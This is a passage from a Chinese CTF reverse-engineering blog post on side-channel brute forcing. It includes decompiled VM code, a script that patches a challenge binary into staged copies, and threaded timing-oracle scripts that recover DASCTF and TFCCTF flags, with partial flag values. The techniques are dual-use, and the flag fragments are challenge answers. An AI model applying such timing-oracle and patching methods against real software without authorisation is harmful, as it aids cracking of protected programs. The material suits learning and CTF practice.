class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2LL</span>:</span><br><span class="line">      v24 = v46;</span><br><span class="line">      v25 = v48;</span><br><span class="line">      <span class="keyword">if</span> ( (v15 &amp; <span class="number">0x20</span>) != <span class="number">0</span> )</span><br><span class="line">        *(_BYTE *)(OPCODES_REGS + v47 + <span class="number">1048</span>) = *(_BYTE *)(OPCODES_REGS + v21 + <span class="number">1040</span>);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        *(_BYTE *)(OPCODES_REGS + v22 + <span class="number">1040</span>) = *(_BYTE *)(OPCODES_REGS + v47 + <span class="number">1048</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v26 = <span class="number">2</span> * v24;</span><br><span class="line">  v27 = <span class="number">2</span> * v24 + <span class="number">8</span> * v25;</span><br><span class="line">  v28 = v24 &amp; <span class="number">3</span>;</span><br><span class="line">  v29 = (v27 &gt;&gt; <span class="number">3</span>) &amp; <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">switch</span> ( v27 &gt;&gt; <span class="number">6</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v28 + <span class="number">1040</span>) = *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v28 + <span class="number">1041</span>);</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v29 + <span class="number">1040</span>) = *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v29 + <span class="number">1041</span>);</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v28 + <span class="number">1041</span>) = <span class="number">0</span>;</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v29 + <span class="number">1041</span>) = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + (<span class="type">unsigned</span> __int8)(v29 | (<span class="number">4</span> * ((v27 &amp; <span class="number">0x20</span>) != <span class="number">0</span>))) + <span class="number">1040</span>) = *(_BYTE *)(OPCODES_REGS + v28 + <span class="number">1040</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      <span class="keyword">if</span> ( (v27 &amp; <span class="number">0x20</span>) != <span class="number">0</span> )</span><br><span class="line">        *(_BYTE *)(OPCODES_REGS + v29 + <span class="number">1048</span>) = *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v28 + <span class="number">1040</span>);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v28 + <span class="number">1041</span>) = *(_BYTE *)(OPCODES_REGS + v29 + <span class="number">1048</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + <span class="number">1051</span>) = v27 &amp; <span class="number">0x3E</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v30 = v25;</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(__int64, _QWORD))sub_40A800)(OPCODES_REGS, (<span class="type">unsigned</span> <span class="type">int</span>)(v25 - <span class="number">116</span>));</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(__int64, _QWORD))sub_40A800)(OPCODES_REGS, (<span class="type">unsigned</span> <span class="type">int</span>)(v30 - <span class="number">72</span>));</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(__int64, _QWORD))sub_40A800)(OPCODES_REGS, (<span class="type">unsigned</span> <span class="type">int</span>)(v30 - <span class="number">84</span>));</span><br><span class="line">  LOBYTE(v31) = <span class="number">0x80</span>;</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(__int64, __int64))sub_40A800)(OPCODES_REGS, v31);</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(__int64, _QWORD))sub_40A800)(OPCODES_REGS, (<span class="type">unsigned</span> <span class="type">int</span>)(v30 - <span class="number">76</span>));</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(__int64, _QWORD))sub_40A800)(OPCODES_REGS, (<span class="type">unsigned</span> <span class="type">int</span>)(v30 - <span class="number">104</span>));</span><br><span class="line">  v32 = <span class="number">2</span> * v30;</span><br><span class="line">  LOBYTE(v32) = <span class="number">2</span> * v30 - <span class="number">88</span>;</span><br><span class="line">  v33 = v51 &amp; <span class="number">3</span>;</span><br><span class="line">  v34 = ((<span class="type">unsigned</span> __int8)v32 &gt;&gt; <span class="number">3</span>) &amp; <span class="number">3</span>;</span><br><span class="line">  v35 = v32;</span><br><span class="line">  <span class="keyword">switch</span> ( (<span class="type">unsigned</span> __int8)v32 &gt;&gt; <span class="number">6</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v33 + <span class="number">1040</span>) = *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v33 + <span class="number">1041</span>);</span><br><span class="line">      v35 = *(<span class="type">unsigned</span> __int8 *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v34 + <span class="number">1041</span>);</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v34 + <span class="number">1040</span>) = v35;</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v33 + <span class="number">1041</span>) = <span class="number">0</span>;</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v34 + <span class="number">1041</span>) = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + (<span class="type">unsigned</span> __int8)(v34 | (<span class="number">4</span> * ((v32 &amp; <span class="number">0x20</span>) != <span class="number">0</span>))) + <span class="number">1040</span>) = *(_BYTE *)(OPCODES_REGS + v33 + <span class="number">1040</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      <span class="keyword">if</span> ( (v32 &amp; <span class="number">0x20</span>) != <span class="number">0</span> )</span><br><span class="line">        *(_BYTE *)(OPCODES_REGS + v34 + <span class="number">1048</span>) = *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v33 + <span class="number">1040</span>);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v33 + <span class="number">1041</span>) = *(_BYTE *)(OPCODES_REGS + v34 + <span class="number">1048</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + <span class="number">1051</span>) = v32 &amp; <span class="number">0x3E</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  LOBYTE(v35) = <span class="number">-124</span>;</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(__int64, __int64))sub_40A800)(OPCODES_REGS, v35);</span><br><span class="line">  v36 = v52 &amp; <span class="number">3</span>;</span><br><span class="line">  v37 = ((<span class="type">unsigned</span> __int8)(v49 - <span class="number">88</span>) &gt;&gt; <span class="number">3</span>) &amp; <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">switch</span> ( (<span class="type">unsigned</span> __int8)(v49 - <span class="number">88</span>) &gt;&gt; <span class="number">6</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v36 + <span class="number">1040</span>) = *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v36 + <span class="number">1041</span>);</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v37 + <span class="number">1040</span>) = *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v37 + <span class="number">1041</span>);</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v36 + <span class="number">1041</span>) = <span class="number">0</span>;</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v37 + <span class="number">1041</span>) = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + (<span class="type">unsigned</span> __int8)(v37 | (<span class="number">4</span> * ((((_BYTE)v49 - <span class="number">88</span>) &amp; <span class="number">0x20</span>) != <span class="number">0</span>))) + <span class="number">1040</span>) = *(_BYTE *)(OPCODES_REGS + v36 + <span class="number">1040</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      <span class="keyword">if</span> ( (((_BYTE)v49 - <span class="number">88</span>) &amp; <span class="number">0x20</span>) != <span class="number">0</span> )</span><br><span class="line">        *(_BYTE *)(OPCODES_REGS + v37 + <span class="number">1048</span>) = *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v36 + <span class="number">1040</span>);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v36 + <span class="number">1041</span>) = *(_BYTE *)(OPCODES_REGS + v37 + <span class="number">1048</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + <span class="number">1051</span>) = (v49 - <span class="number">88</span>) &amp; <span class="number">0x3E</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(__int64, _QWORD))sub_40A800)(OPCODES_REGS, <span class="number">0LL</span>);</span><br><span class="line">  LOBYTE(v38) = <span class="number">-100</span>;</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(__int64, __int64))sub_40A800)(OPCODES_REGS, v38);</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(__int64, _QWORD))sub_40A800)(OPCODES_REGS, v24 - <span class="number">116</span>);</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(__int64, _QWORD))sub_40A800)(OPCODES_REGS, v24 - <span class="number">72</span>);</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(__int64, _QWORD))sub_40A800)(OPCODES_REGS, v24 - <span class="number">84</span>);</span><br><span class="line">  LOBYTE(v39) = <span class="number">0x80</span>;</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(__int64, __int64))sub_40A800)(OPCODES_REGS, v39);</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(__int64, _QWORD))sub_40A800)(OPCODES_REGS, v24 - <span class="number">76</span>);</span><br><span class="line">  LOBYTE(v24) = v24 - <span class="number">104</span>;</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(__int64, _QWORD))sub_40A800)(OPCODES_REGS, v24);</span><br><span class="line">  v40 = v26 - <span class="number">88</span>;</span><br><span class="line">  v41 = (v40 &gt;&gt; <span class="number">3</span>) &amp; <span class="number">3</span>;</span><br><span class="line">  v42 = v40 &gt;&gt; <span class="number">6</span>;</span><br><span class="line">  <span class="keyword">switch</span> ( v40 &gt;&gt; <span class="number">6</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v28 + <span class="number">1040</span>) = *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v28 + <span class="number">1041</span>);</span><br><span class="line">      v42 = *(<span class="type">unsigned</span> __int8 *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v41 + <span class="number">1041</span>);</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v41 + <span class="number">1040</span>) = v42;</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v28 + <span class="number">1041</span>) = <span class="number">0</span>;</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v41 + <span class="number">1041</span>) = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + (<span class="type">unsigned</span> __int8)(v41 | (<span class="number">4</span> * ((v40 &amp; <span class="number">0x20</span>) != <span class="number">0</span>))) + <span class="number">1040</span>) = *(_BYTE *)(OPCODES_REGS + v28 + <span class="number">1040</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      <span class="keyword">if</span> ( (v40 &amp; <span class="number">0x20</span>) != <span class="number">0</span> )</span><br><span class="line">        *(_BYTE *)(OPCODES_REGS + v41 + <span class="number">1048</span>) = *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v28 + <span class="number">1040</span>);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v28 + <span class="number">1041</span>) = *(_BYTE *)(OPCODES_REGS + v41 + <span class="number">1048</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + <span class="number">1051</span>) = v40 &amp; <span class="number">0x3E</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  LOBYTE(v42) = <span class="number">-124</span>;</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(__int64, __int64))sub_40A800)(OPCODES_REGS, v42);</span><br><span class="line">  *(_BYTE *)(OPCODES_REGS + <span class="number">1049</span>) = *(_BYTE *)(OPCODES_REGS + v21 + <span class="number">1040</span>);</span><br><span class="line">  LOBYTE(v43) = <span class="number">4</span>;</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(__int64, __int64))sub_40A800)(OPCODES_REGS, v43);</span><br><span class="line">  LOBYTE(v44) = <span class="number">-100</span>;</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(__int64, __int64))sub_40A800)(OPCODES_REGS, v44);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很明显是难以直接分析或者模拟这个过程进行爆破的 这时候就会自然想到直接对程序输入数据进行爆破的方法 python的<code>subprocess</code>模块就是实现这个想法和下面侧信道攻击的关键 对于这道题 由于缺少侧信道爆破的关键要素–程序含有大量导致程序退出的分支 所以这里要修改一下程序</p>
<p>动调的过程可以很明显看出上述<code>OPCODES_REGS</code>偏移为1040开始是一系列的寄存器 0~1040的数据目测是opcode不过这个不重要 直接看到所有处理函数执行完后的校验环节:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F08%2F29%2F20240829-111502.png" alt="image-20240829111502100"></p>
<p>可以看到程序通过检查第8个(8 * 131 &#x3D; 1048)寄存器的值来判断是否正确 这时候再调试一遍 着重观察第八个寄存器 可以看到每次执行完proc都会增加1~2 最后是一个非零值 这时候就能猜测到这是储存经过对比后和正确数据不相等的数据的个数的 这时候就能开始准备patch程序了 这里选择在每个<code>proc()</code>后的指令patch为跳转到判断目标寄存器的<code>jmp</code>指令(如果要在每个proc后直接增加一个或者修改成<code>cmp</code>的话可能会因为指令长度的问题爆段) 观察到每次proc指令后都会对比<code>r15</code>寄存器的值进行异常处理:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F08%2F29%2F20240829-112123.png" alt="image-20240829112123666"></p>
<p>据此筛选出符合条件的21个<code>cmp</code>(最后一个proc不用跳转) patch成目标指令:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> keystone <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">pe = <span class="string">&#x27;bzff\\vm.exe&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(pe, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = <span class="built_in">bytearray</span>(f.read())</span><br><span class="line">    target = <span class="number">0x40B2E0</span></span><br><span class="line">    base = <span class="number">0x400c00</span></span><br><span class="line">    end = <span class="number">0x40CF45</span></span><br><span class="line">    ks = Ks(KS_ARCH_X86, KS_MODE_64)</span><br><span class="line">    cs = Cs(CS_ARCH_X86, CS_MODE_64)</span><br><span class="line">    to_patch = []</span><br><span class="line">    <span class="keyword">for</span> ins <span class="keyword">in</span> cs.disasm(data[target - base: end - base], target):</span><br><span class="line">        <span class="keyword">if</span> ins.mnemonic == <span class="string">&#x27;cmp&#x27;</span> <span class="keyword">and</span> ins.op_str.startswith(<span class="string">&#x27;r15&#x27;</span>):</span><br><span class="line">            to_patch.append(ins.address)</span><br><span class="line">    c = <span class="number">0</span></span><br><span class="line">    to_patch = to_patch[<span class="number">8</span>:]</span><br><span class="line">    <span class="keyword">for</span> ins <span class="keyword">in</span> to_patch[::-<span class="number">1</span>]:</span><br><span class="line">        new_op = <span class="string">&#x27;jmp 0x40CE56&#x27;</span></span><br><span class="line">        new_ins, count = ks.asm(new_op, ins)</span><br><span class="line">        <span class="keyword">if</span> count != <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Failed to assemble&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        data[ins - base: ins - base + <span class="built_in">len</span>(new_ins)] = new_ins</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;Patched <span class="subst">&#123;<span class="built_in">hex</span>(ins)&#125;</span>: <span class="subst">&#123;new_op&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&#x27;bzff\\vm_<span class="subst">&#123;<span class="number">21</span> - c&#125;</span>.exe&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            file.write(data)</span><br><span class="line">        c += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>这样就获得了每次对比2*n(0 &lt; n &lt; 23)个数据的22个pe文件 接下来要做的就是像这些pe文件输入 接下来的想法就是将通过了第n轮检测的数据输入到第n + 1个pe文件中进行下一轮的判断 直到进行完所有的22轮 这里的第一步处理导致实际上每一轮检测的2个数据对应的是32 &#x2F; 22 ≈ 1.5个数据 这是这题的爆破解法的最后一个难点 需要手动控制已确定字符的长度并手动修改需要进行判断的轮数:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess, threading, time, copy</span><br><span class="line"></span><br><span class="line">stdouts = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">arg, c, i</span>):</span><br><span class="line">    proc = subprocess.Popen([<span class="string">f&#x27;bzff\\vm.exe_<span class="subst">&#123;i&#125;</span>&#x27;</span>], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=<span class="literal">True</span>)</span><br><span class="line">    stdout, stderr = proc.communicate(<span class="built_in">input</span>=arg)</span><br><span class="line">    stdouts[c] = stdout[-<span class="number">2</span>:]</span><br><span class="line">    <span class="comment"># print(f&#x27;[+]Testing: &#123;c&#125;&#x27;)</span></span><br><span class="line">    <span class="keyword">return</span> stdout</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_thread_exit</span>(<span class="params">threads</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">all</span>(<span class="keyword">not</span> thread.is_alive() <span class="keyword">for</span> thread <span class="keyword">in</span> threads):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">    threads.clear()</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">list</span>(<span class="string">&#x27;DASCTF&#123;&#x27;</span>)</span><br><span class="line">flag += <span class="built_in">list</span>(<span class="string">&#x27;c669733af3ce4459b88016420b81cb15&#x27;</span>)</span><br><span class="line">flag += <span class="built_in">list</span>(<span class="string">&#x27;_&#x27;</span> * (<span class="number">39</span> - <span class="built_in">len</span>(flag)) + <span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(flag))</span><br><span class="line">char_table = <span class="string">&#x27;0123456789abcdef&#x27;</span></span><br><span class="line">offset = <span class="number">21</span></span><br><span class="line">threads = []</span><br><span class="line">pieces = []</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> char_table:</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> char_table:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> char_table:</span><br><span class="line">            input_content = copy.deepcopy(flag)</span><br><span class="line">            input_content[<span class="number">7</span> + <span class="number">8</span> + offset : <span class="number">7</span> + <span class="number">8</span> + offset + <span class="number">3</span>] = [a, b, c]</span><br><span class="line">            input_content = <span class="string">&#x27;&#x27;</span>.join(input_content)</span><br><span class="line">            <span class="built_in">print</span>(input_content)</span><br><span class="line">            t = threading.Thread(target=run, args=(input_content, a+b+c, offset))</span><br><span class="line">            threads.append(t)</span><br><span class="line">            t.start()</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(threads) == <span class="number">256</span>:</span><br><span class="line">                check_thread_exit(threads)</span><br><span class="line">                <span class="keyword">for</span> piece <span class="keyword">in</span> stdouts:</span><br><span class="line">                    <span class="keyword">if</span> stdouts[piece] == <span class="string">&#x27;!\n&#x27;</span>:</span><br><span class="line">                        pieces.append(piece)</span><br><span class="line">                stdouts.clear()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;Found: <span class="subst">&#123;pieces&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>实际上如果能找到一种直接对虚拟空间中目标内存空间进行赋值的api就可以实现全自动的爆破 也就是下面侧信道攻击的样式 这里挖个坑</p>
<p>以上就是侧信道攻击最原始的想法 下面详细说明时间侧信道攻击的方法和例子</p>
<p>上面应该也能看出来主要是通过<code>subprocess.Popen()</code>直接执行程序 如果程序通过命令行参数接收数据的话就直接将要添加的命令行参数添加到第一个参数的列表中 否则就像上面用<code>communicate()</code>方法进行数据交互 要注意的是只能输入可编码的数据(可见字符) 不能是字节串 时间侧信道攻击的另一个核心就是检查程序的执行时间并将每个输入的数据与进行这个输入后程序的运行时间对应起来 找到运行(存活)时间最长的一个输入当作正确的已确定字符 这里用TFCCTF2024的一道逆向作为例子</p>
<h2 id="2024-TFCCTF-Functional"><a href="#2024-TFCCTF-Functional" class="headerlink" title="[2024 TFCCTF] Functional"></a>[2024 TFCCTF] Functional</h2><p>程序是用Haskell编译的 比加了混淆还史 几乎不可能静态分析出加密和校验 上网找Haskell逆向的方法 几乎都是爆破 其中有一篇是通过pintool找到程序执行过的指令的条数来进行侧信道攻击 其实本质上和对时间的侧信道攻击大差不大 因为执行的指令条数在一定程度上可以用执行的时间来衡量 而执行的指令越多 执行的时间越长就说明越有可能是正确的字符(如果错误会直接退出) 这道题就是专门为这种方法设计的:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess, threading, time</span><br><span class="line"></span><br><span class="line">times = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">arg, c</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+]Testing:&#x27;</span> + arg)</span><br><span class="line">    t1 = time.time()</span><br><span class="line">    proc = subprocess.Popen([<span class="string">&#x27;./main&#x27;</span>, arg], stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line">    stdout, stderr = proc.communicate()</span><br><span class="line">    cost = time.time() - t1</span><br><span class="line">    times[c] = cost</span><br><span class="line">    <span class="keyword">return</span> stdout</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_thread_exit</span>(<span class="params">threads</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">all</span>(<span class="keyword">not</span> thread.is_alive() <span class="keyword">for</span> thread <span class="keyword">in</span> threads):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">elf = <span class="string">&#x27;./main&#x27;</span></span><br><span class="line"><span class="comment"># times = &#123;&#125;</span></span><br><span class="line"><span class="comment"># for i in range(0x40):</span></span><br><span class="line"><span class="comment">#     input_content = i * &#x27;_&#x27;</span></span><br><span class="line"><span class="comment">#     t1 = time.time()</span></span><br><span class="line"><span class="comment">#     proc = subprocess.Popen([elf, input_content], stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span></span><br><span class="line"><span class="comment">#     stdout, stderr = proc.communicate()</span></span><br><span class="line"><span class="comment">#     cost = time.time() - t1</span></span><br><span class="line"><span class="comment">#     times[str(i)] = cost</span></span><br><span class="line"><span class="comment"># print(times)</span></span><br><span class="line">right_len = <span class="number">28</span></span><br><span class="line">flag = <span class="built_in">list</span>(<span class="string">&#x27;TFCCTF&#123;&#x27;</span> + <span class="string">&#x27;A&#x27;</span> * (right_len - <span class="number">7</span>))</span><br><span class="line">char_table = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_&#123;&#125;+-!@#$%^&amp;*()&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>, right_len):</span><br><span class="line">    threads = []</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> char_table:</span><br><span class="line">        input_content = flag</span><br><span class="line">        input_content[i] = c</span><br><span class="line">        input_content = <span class="string">&#x27;&#x27;</span>.join(input_content)</span><br><span class="line">        t = threading.Thread(target=run, args=(input_content, c))</span><br><span class="line">        threads.append(t)</span><br><span class="line">        t.start()</span><br><span class="line">    check_thread_exit(threads)</span><br><span class="line">    most_likely = <span class="built_in">sorted</span>(times.items(), key=<span class="keyword">lambda</span> x: x[<span class="number">1</span>], reverse=<span class="literal">True</span>)[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    flag[i] = most_likely</span><br><span class="line">    times.clear()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n[+]Solution found:&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(flag))</span><br></pre></td></tr></table></figure>

<p>除了在普通的加密-校验程序中可以用到 侧信道还能在简单的游戏逆向中发挥作用 比如下面这个例子</p>
<h2 id="2024-DASCTF八月开学季-maze"><a href="#2024-DASCTF八月开学季-maze" class="headerlink" title="[2024 DASCTF八月开学季] maze"></a>[2024 DASCTF八月开学季] maze</h2><p>直接看主函数可以看到是一个8 * 8 * 8的三维迷宫 没有设置地图边界 移动时只有碰到墙壁才会停下 越界则会直接判定失败并结束程序:</p>
